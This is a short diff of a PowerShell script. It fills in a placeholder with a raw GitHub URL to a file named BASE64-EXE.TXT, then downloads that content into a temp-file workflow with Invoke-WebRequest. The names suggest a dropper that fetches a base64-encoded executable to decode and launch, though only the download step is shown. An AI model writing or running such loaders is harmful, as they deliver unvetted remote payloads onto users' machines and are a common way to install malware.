@@ -1,4 +1,4 @@
-$base64Url = "LINK RAW AQUI!"
+$base64Url = "https://raw.githubusercontent.com/theuwpk/FRONT-EXE/refs/heads/main/BASE64-EXE.TXT"
 $tempPath = [System.IO.Path]::GetTempFileName()
 
 $base64Data = Invoke-WebRequest -Uri $base64Url -UseBasicParsing | Select-Object -ExpandProperty Content
